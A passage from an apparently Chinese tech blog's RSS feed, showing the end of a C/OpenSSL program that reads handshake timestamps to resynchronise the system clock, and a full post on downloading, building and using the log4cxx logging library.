#969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">unsigned</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">buf</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #81a2be;">size_t</span> <span style="color: #f0c674;">len</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #81a2be;">SSL</span> *<span style="color: #f0c674;">ssl</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #81a2be;">TimeInfo</span> *<span style="color: #f0c674;">ti</span>)
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span>(content_type != 22)   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">require handshake message</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span>(len &lt; 42)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span>(buf[0] == 1)          <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">ClientHello Message send from client to server</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ti-&gt;client = htonl(*((<span style="color: #81a2be;">u_long</span>*)(buf + 6)));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span>(buf[0] == 2)     <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">ServerHello Message send from server to client</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ti-&gt;server = htonl(*((<span style="color: #81a2be;">u_long</span>*)(buf + 6)));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">else</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span>;
}

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>()
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">BIO</span> * <span style="color: #f0c674;">bio</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">SSL</span> * <span style="color: #f0c674;">ssl</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">SSL_CTX</span> * <span style="color: #f0c674;">ctx</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">TimeInfo</span> <span style="color: #f0c674;">timeInfo</span> = {-1, -1};
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">BOOL</span> <span style="color: #f0c674;">timeSynced</span> = FALSE;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">long</span> <span style="color: #f0c674;">result</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Set up the library </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_library_init();
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ERR_load_BIO_strings();
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_load_error_strings();

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Set up the SSL context </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ctx = SSL_CTX_new(SSLv3_client_method());
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span>(ctx == <span style="color: #81a2be;">NULL</span>)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"Error new SSL_CTX\n"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ERR_print_errors_fp(stderr);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CTX_free(ctx);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Get Server and Client system time via SSL Handshake </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CTX_set_msg_callback(ctx, getSSLHandleShakeTimeInfo);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CTX_set_msg_callback_arg(ctx, &amp;timeInfo);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Load the trust store </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span> SSL_CTX_load_verify_locations(ctx, <span style="color: #8abeb7;">".\\certs\\cacert.pem"</span>, <span style="color: #81a2be;">NULL</span>))
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"Error loading trust store\n"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ERR_print_errors_fp(stderr);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CTX_free(ctx);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Setup the connection </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> bio = BIO_new_ssl_connect(ctx);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Set the SSL_MODE_AUTO_RETRY flag </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> BIO_get_ssl(bio, &amp; ssl);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Create and setup the connection </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> BIO_set_conn_hostname(bio, <span style="color: #8abeb7;">"192.168.1.5:5555"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span>(BIO_do_connect(bio) &lt;= 0)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"Error attempting to connect\n"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ERR_print_errors_fp(stderr);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> BIO_free_all(bio);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CTX_free(ctx);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Check the certificate </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">switch</span>(SSL_get_verify_result(ssl))
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">case</span> X509_V_OK:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">break</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">case</span> X509_V_ERR_CERT_NOT_YET_VALID:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">case</span> X509_V_ERR_CERT_HAS_EXPIRED:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span>(timeInfo.server != -1 &amp;&amp; timeInfo.client != -1)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"&#24403;&#21069;&#23458;&#25143;&#31471;&#26102;&#38388;: %s"</span>, ctime(&amp;timeInfo.client));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"&#24403;&#21069;&#26381;&#21153;&#22120;&#26102;&#38388;: %s"</span>, ctime(&amp;timeInfo.server));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"&#23581;&#35797;&#19982;&#26381;&#21153;&#22120;&#26102;&#38388;&#21516;&#27493;"</span>);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span>(syncSystemTime(timeInfo.server))
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"&#25104;&#21151;\n"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">else</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"&#22833;&#36133;\n"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"&#35831;&#37325;&#35797;&#36830;&#25509;&#26381;&#21153;&#22120;&#65281;\n"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">default</span>:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"Certificate verification error: %i\n"</span>, SSL_get_verify_r<span style="text-decoration: underline;">esult(ssl));</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> BIO_free_all(bio);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CTX_free(ctx);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Close the connection and free the context </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> BIO_free_all(bio);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> SSL_CTX_free(ctx);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[log4cxx使用心得]]></title>
            <link>/article/log4cxx-4f7f75285fc35f97.html</link>
            <guid>/article/log4cxx-4f7f75285fc35f97.html</guid>
            <pubDate>Tue, 17 Jun 2008 02:01:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
简介
</p>

<p>
apache出品必属精品。正宗c++日志库，与log4j一脉相承。
</p>

<p>
<a href="http://logging.apache.org/log4cxx/index.html">http://logging.apache.org/log4cxx/index.html</a>
</p></li>

<li><p>
下载、编译、安装
</p>

<p>
打算安装到${HOME}/libs目录下：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">cd</span> ~/libs
wget http://mirror.bjtu.edu.cn/apache//apr/apr-1.4.4.tar.bz2
tar xjvf apr-1.4.4.tar.bz2
<span style="color: #b294bb;">cd</span> apr-1.4.4
./configure --prefix=${<span style="color: #f0c674;">HOME</span>}/libs &amp;&amp; make &amp;&amp; make install
<span style="color: #b294bb;">cd</span> ..
wget http://mirror.bjtu.edu.cn/apache//apr/apr-util-1.3.11.tar.bz2
tar xjvf apr-util-1.3.11.tar.bz2
<span style="color: #b294bb;">cd</span> apr-util-1.3.11
./configure --prefix=${<span style="color: #f0c674;">HOME</span>}/libs --with-apr=${<span style="color: #f0c674;">HOME</span>}/libs &amp;&amp; make &amp;&amp; make instal<span style="text-decoration: underline;">l</span>
<span style="color: #b294bb;">cd</span> ..
wget http://apache.etoak.com//logging/log4cxx/0.10.0/apache-log4cxx-0.10.0.tar.g<span style="text-decoration: underline;">z</span>
tar xzvf apache-log4cxx-0.10.0.tar.gz
<span style="color: #b294bb;">cd</span> apache-log4cxx-0.10.0
./configure --with-charset=utf-8 --prefix=${<span style="color: #f0c674;">HOME</span>}/libs --with-apr=${<span style="color: #f0c674;">HOME</span>}/libs -<span style="text-decoration: underline;">-with-apr-util=${</span><span style="color: #f0c674; text-decoration: underline;">HOME</span><span style="text-decoration: underline;">}/libs &amp;&amp; make &amp;&amp; make install</span>
</pre>
</div></li>

<li><p>
使用例子
</p>

<p>
<code>hello.cpp</code> ：
</p>
<div class="org-src-container">
<pre class="src src-cpp"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">"log4cxx/logger.h"</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">"log4cxx/propertyconfigurator.h"</span>

<span style="color: #b5bd68;">static</span> <span style="color: #81a2be;">log4cxx</span>::<span style="color: #81a2be;">LoggerPtr</span> <span style="color: #de935f;">logger</span>(<span style="color: #81a2be;">log4cxx</span>::<span style="color: #81a2be;">Logger</span>::getLogger(<span style="color: #8abeb7;">"hello"</span>));

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">log4cxx</span>::<span style="color: #81a2be;">PropertyConfigurator</span>::configure(<span style="color: #8abeb7;">"./log4cxx_hello.properties"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> LOG4CXX_INFO(logger, <span style="color: #8abeb7;">"&#20320;&#22909;&#65292;log4cxx!"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<p>
<code>log4cxx_hello.properties</code> ：
</p>
<pre class="example">
log4j.rootLogger=debug, R

log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout

# Pattern to output the caller's file name and line number.
log4j.appender.stdout.layout.ConversionPattern=%5p [%t] (%F:%L) - %m%n

log4j.appender.R=org.apache.log4j.RollingFileAppender
log4j.appender.R.File=./hello.log

log4j.appender.R.MaxFileSize=100KB
# Keep one backup file
log4j.appender.R.MaxBackupIndex=10

log4j.appender.R.layout=org.apache.log4j.PatternLayout
log4j.appender.R.layout.ConversionPattern=%5p %c [%t] (%F:%L) - %m%n
</pre>

<p>
编译：
</p>
<div class="org-src-container">
<pre class="src src-sh">g++ -o hello hello.cpp -I${<span style="color: #f0c674;">HOME</span>}/libs/include ${<span style="color: #f0c674;">HOME</span>}/libs/lib/liblog4cxx.a ${<span style="color: #f0c674;">HO</span><span style="color: #f0c674; text-decoration: underline;">ME</span><span style="text-decoration: underline;">}/libs/lib/libaprutil-1.a ${</span><span style="color: #f0c674; text-decoration: underline;">HOME</span><span style="text-decoration: underline;">}/libs/lib/libapr-1.a  -lexpat -lpthread</span>
</pre>
</div></li>

<li><p>
注意事项
</p>

<p>
由于一个日志文件写满后会重命名所有已有的日志文件，配置过大MaxBackupIndex的会有性能问题，因此log4cxx编译时限制了它的大小（大概十多个）以避免配置的MaxBackupIndex过大，如果要设置更大一点的MaxFileSize来保存更多日志，需要在编译前进行修改。
</p>

<p>
参考：<a href="http://objectmix.com/apache/684503-urgent-log4cxx-large-window-sizes-not-allowed.html">http://objectmix.com/apache/684503-urgent-log4cxx-large-window-sizes-not-allowed.html</a>
</p></li>

<li>使用技巧
<ul class="org-ul">
<li><p>
决定配置文件的格式（xml，property）。以使用相应的配置器（Configurator）装入配置文件。
</p>

<p>
xml虽较property格式繁锁，支持的配置面更全，而property格式的配置文件使用更简单，容易在网上找到现成的配置文件。
</p></li>

<li><p>
logger命名
</p>

<p>
logger名称反映了软件模块，如果有代表软件模块的类，则在类中包含以该类类名命名的logger对象，该模块功能相关代码通过该logger进行日志记录。
另外可将logger对象作为全局变量，方便使用，特别是当软件模块较松散，并无对应的封装类时。
</p></li>

<li>在代码中适当地放置日志代码。引用适当的日志对象，对日志进行适当分级。</li>

<li>余下的工作就是修改配置文件，对日志进行控制了。</li>
</ul></li>
</ul>

<p>
　　使用配置文件的好处就是可以方便地配置日志而不需要修改源代码，可以在配置文件中方便配置日志过滤、格式、日志目的地。
</p>

<ul class="org-ul">
<li>体验</li>
</ul>

<p>
　之前产品中用到的是log4cplus，但是常常有写日志崩溃的情况出现，使用log4cxx正是用于解决该崩溃。</p>
]]></content:encoded>
        </item>
    </channel>
</rss>